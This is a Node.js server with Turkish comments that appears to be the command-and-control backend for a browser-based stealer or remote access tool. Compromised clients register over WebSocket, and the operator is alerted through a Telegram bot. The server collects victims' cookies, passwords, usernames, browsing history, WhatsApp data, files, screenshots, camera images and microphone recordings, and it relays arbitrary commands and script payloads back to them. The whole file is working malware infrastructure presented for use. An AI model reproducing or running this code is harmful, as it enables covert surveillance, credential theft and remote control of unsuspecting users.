const express = require('express');
const { WebSocketServer } = require('ws');
const fs = require('fs').promises;
const path = require('path');
const fetch = require('node-fetch');
require('dotenv').config(); // .env dosyasını yükle

const app = express();

// JSON gövdesini ayrıştırmak için middleware (yeni ekleme)
app.use(express.json());

// .env’den değişkenleri al
const ACCESS_TOKEN = process.env.ACCESS_TOKEN;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Token kontrol middleware’i
function checkToken(req, res, next) {
    const token = req.query.token || req.body.token;
    if (!token) {
        console.error('Token eksik:', req.method, req.url, req.body);
        return res.status(400).json({ error: 'Token gerekli' });
    }
    if (token !== ACCESS_TOKEN) {
        console.error('Geçersiz token:', token);
        return res.status(403).json({ error: 'Erişim reddedildi: Geçersiz token' });
    }
    next();
}

// Telegram’a mesaj gönder
async function sendTelegramMessage(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
        });
        if (!response.ok) throw new Error(`Telegram API hatası: ${response.statusText}`);
        console.log('Telegram mesajı gönderildi:', message);
    } catch (err) {
        console.error('Telegram mesajı gönderme hatası:', err.message);
    }
}

// Statik dosyaları token kontrolüyle sun
app.get('/', checkToken, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Diğer endpoint’ler için de token kontrolü
app.get('/clients', checkToken, (req, res) => {
    const clientList = [...clients.entries()].map(([clientId, data]) => ({
        clientId,
        isActive: data.isActive
    }));
    res.json(clientList);
});

app.route('/sendCommand')
    .get(checkToken, (req, res) => {
        const { clientId, command, payload } = req.query;
        const clientData = clients.get(clientId);
        console.log(`Komut alındı (GET): ${command}, Client: ${clientId}, Payload: ${payload}`);
        if (!clientId || !command) {
            console.error('Eksik parametreler (GET):', req.query);
            return res.status(400).json({ error: 'clientId ve command gerekli' });
        }
        if (clientData && clientData.ws && clientData.ws.readyState === clientData.ws.OPEN) {
            clientData.ws.send(JSON.stringify({ command, clientId, payload }));
            res.json({ message: 'Komut gönderildi' });
        } else {
            console.log(`Client bulunamadı veya kapalı: ${clientId}`);
            res.status(404).json({ error: 'Client bağlantısı kapalı' });
        }
    })
    .post(checkToken, (req, res) => {
        const { clientId, command, payload, token } = req.body;
        const clientData = clients.get(clientId);
        console.log(`Komut alındı (POST): ${command}, Client: ${clientId}, Payload: ${payload ? payload.slice(0, 100) + '...' : 'yok'}`);
        if (!clientId || !command) {
            console.error('Eksik parametreler (POST):', req.body);
            return res.status(400).json({ error: 'clientId ve command gerekli' });
        }
        if (clientData && clientData.ws && clientData.ws.readyState === clientData.ws.OPEN) {
            clientData.ws.send(JSON.stringify({ command, clientId, payload }));
            res.json({ message: 'Komut gönderildi' });
        } else {
            console.log(`Client bulunamadı veya kapalı: ${clientId}`);
            res.status(404).json({ error: 'Client bağlantısı kapalı' });
        }
    });

app.get('/getlog', checkToken, async (req, res) => {
    const { clientId, type } = req.query;
    if (!['cookies', 'username', 'password', 'screenshot', 'tabs', 'file', 'scriptResult', 'whatsapp', 'history', 'camera', 'mic', 'activeTabScriptResult'].includes(type)) {
        return res.status(400).json({ error: 'Geçersiz log tipi' });
    }

    const filePath = ['screenshot', 'file', 'camera', 'mic'].includes(type) ?
        path.join(__dirname, 'logs', 'general_logs.json') :
        path.join(__dirname, 'logs', `${type}.json`);

    let filteredLogs = [];
    try {
        const fileContent = await fs.readFile(filePath, 'utf8');
        const fileLogs = JSON.parse(fileContent);
        filteredLogs = clientId ? fileLogs.filter(log => log.clientId === clientId) : fileLogs;
    } catch (e) {
        filteredLogs = clientId ? logs[type].filter(log => log.clientId === clientId) : logs[type];
        if (filteredLogs.length === 0) return res.status(404).json({ error: 'Log bulunamadı' });
    }

    res.json(filteredLogs.length ? filteredLogs : { error: 'Log bulunamadı' });
});

app.get('/deleteClient', checkToken, async (req, res) => {
    const { clientId } = req.query;
    if (!clientId) return res.status(400).json({ error: 'clientId gerekli' });
    if (clients.has(clientId)) {
        const clientData = clients.get(clientId);
        if (clientData.ws && clientData.ws.readyState === clientData.ws.OPEN) clientData.ws.close();
        clients.delete(clientId);
        await saveClients(); // Silme sonrası clients.json’u güncelle
        res.json({ message: `${clientId} silindi` });
    } else {
        res.status(404).json({ error: 'Client bulunamadı' });
    }
});

// Public klasöründeki diğer dosyalar (örneğin screenshot’lar) için statik servis
app.use('/files', checkToken, express.static(path.join(__dirname, 'public/files')));

let clients = new Map();
let logs = { 
    cookies: [], 
    username: [], 
    password: [], 
    screenshot: [], 
    tabs: [], 
    file: [], 
    scriptResult: [], 
    whatsapp: [], 
    history: [], 
    camera: [], 
    mic: [], 
    activeTabScriptResult: [] 
};
const CLIENTS_FILE = path.join(__dirname, 'logs', 'clients.json');

// Client’ları dosyaya kaydet
async function saveClients() {
    try {
        const clientsData = [...clients.entries()].map(([clientId, data]) => ({
            clientId,
            isActive: data.isActive
        }));
        await fs.writeFile(CLIENTS_FILE, JSON.stringify(clientsData, null, 2));
        console.log('Client’lar kaydedildi.');
    } catch (err) {
        console.error('Client kaydetme hatası:', err);
    }
}

// Client’ları dosyadan yükle
async function loadClients() {
    try {
        const fileContent = await fs.readFile(CLIENTS_FILE, 'utf8');
        const clientsData = JSON.parse(fileContent);
        clientsData.forEach(({ clientId, isActive }) => {
            if (!clients.has(clientId)) {
                clients.set(clientId, { ws: null, isActive, timeout: null });
            }
        });
        console.log('Client’lar yüklendi:', clients.size);
    } catch (err) {
        if (err.code !== 'ENOENT') {
            console.error('Client yükleme hatası:', err);
        }
    }
}

// Sunucu başlangıcında client’ları yükle
loadClients().then(() => {
    const server = app.listen(3000, () => console.log('Server 3000 portunda çalışıyor'));
    const wss = new WebSocketServer({ server });

    wss.on('connection', (ws) => {
        ws.on('message', async (data) => {
            const message = JSON.parse(data);

            if (message.type === 'register') {
                clients.set(message.clientId, { ws, isActive: true, timeout: null });
                ws.clientId = message.clientId;
                console.log(`Yeni client: ${message.clientId}, Toplam: ${clients.size}`);
                await saveClients(); // Yeni client’ı kaydet
                // Telegram’a mesaj gönder
                await sendTelegramMessage(`Client ${message.clientId} aktif oldu!`);
            } else if (['username', 'password', 'cookies', 'screenshot', 'tabs', 'file', 'scriptResult', 'whatsapp', 'history', 'camera', 'mic', 'activeTabScriptResult'].includes(message.type)) {
                await saveLog(message);
                updateMemoryLog(message);
                console.log(`${message.type} loglandı: ${message.clientId}`);
            } else if (message.type === 'ping') {
                ws.send(JSON.stringify({ type: 'pong' }));
                console.log(`Ping alındı, pong gönderildi: ${ws.clientId}`);
            }
        });

        ws.on('close', async () => {
            if (ws.clientId) {
                const clientData = clients.get(ws.clientId);
                if (clientData) {
                    clientData.isActive = false;
                    clientData.ws = null; // WebSocket bağlantısını sıfırla
                    console.log(`Client bağlantısı kesildi ve pasif: ${ws.clientId}`);
                    await saveClients(); // Durum değişikliğini kaydet
                }
            }
        });

        ws.on('error', (err) => console.error('WebSocket hatası:', err));
    });
});

async function saveLog(log) {
    const { type, data, clientId, timestamp } = log;
    let filePath;

    if (type === 'username' || type === 'password' || type === 'whatsapp' || type === 'history' || type === 'activeTabScriptResult') {
        filePath = path.join(__dirname, 'logs', `${type}s.json`);
    } else if (type === 'cookies' || type === 'tabs' || type === 'scriptResult') {
        filePath = path.join(__dirname, 'logs', `${type}.json`);
    } else if (type === 'screenshot' || type === 'file' || type === 'camera' || type === 'mic') {
        if (typeof data === 'object' && data.error) {
            log.data = data.error;
            filePath = path.join(__dirname, 'logs', 'general_logs.json');
        } else if (typeof data === 'string' && data.startsWith('data:')) {
            const ext = type === 'screenshot' || type === 'camera' ? 'png' : type === 'mic' ? 'wav' : 'bin';
            const dataPath = path.join(__dirname, 'public/files', `${clientId}_${timestamp}.${ext}`);
            const base64Data = data.replace(/^data:(image\/png|audio\/wav|application\/octet-stream);base64,/, '');
            try {
                await fs.mkdir(path.join(__dirname, 'public/files'), { recursive: true });
                await fs.writeFile(dataPath, base64Data, 'base64');
                log.data = `/files/${path.basename(dataPath)}`;
            } catch (err) {
                console.error(`${type} yazma hatası:`, err);
                log.data = `Hata: ${type} kaydedilemedi`;
            }
            filePath = path.join(__dirname, 'logs', 'general_logs.json');
        } else {
            log.data = 'Hata: Geçersiz veri formatı';
            filePath = path.join(__dirname, 'logs', 'general_logs.json');
        }
    }

    try {
        let existingLogs = [];
        try {
            const fileContent = await fs.readFile(filePath, 'utf8');
            if (fileContent.trim() === '') {
                // Boş dosya, yeni bir dizi başlat
                existingLogs = [];
                await fs.writeFile(filePath, JSON.stringify([]));
            } else {
                existingLogs = JSON.parse(fileContent);
                if (!Array.isArray(existingLogs)) {
                    // Geçersiz JSON, dosyayı sıfırla
                    console.warn(`Geçersiz JSON formatı, ${filePath} sıfırlanıyor`);
                    existingLogs = [];
                    await fs.writeFile(filePath, JSON.stringify([]));
                }
            }
        } catch (e) {
            if (e.code === 'ENOENT') {
                // Dosya yoksa oluştur
                await fs.mkdir(path.join(__dirname, 'logs'), { recursive: true });
                await fs.writeFile(filePath, JSON.stringify([]));
                existingLogs = [];
            } else {
                console.error('JSON parse hatası:', e);
                // Bozuk dosya, sıfırla
                existingLogs = [];
                await fs.writeFile(filePath, JSON.stringify([]));
            }
        }

        if (['cookies', 'tabs'].includes(type)) {
            const existingIndex = existingLogs.findIndex(l => l.clientId === clientId);
            if (existingIndex !== -1) existingLogs[existingIndex] = log;
            else existingLogs.push(log);
        } else {
            existingLogs.push(log);
        }

        await fs.writeFile(filePath, JSON.stringify(existingLogs, null, 2));
    } catch (err) {
        console.error('Log yazma hatası:', err);
    }
}

function updateMemoryLog(log) {
    const { type, clientId } = log;
    if (['cookies', 'tabs'].includes(type)) {
        const existingIndex = logs[type].findIndex(l => l.clientId === clientId);
        if (existingIndex !== -1) logs[type][existingIndex] = log;
        else logs[type].push(log);
    } else {
        logs[type].push(log);
    }
}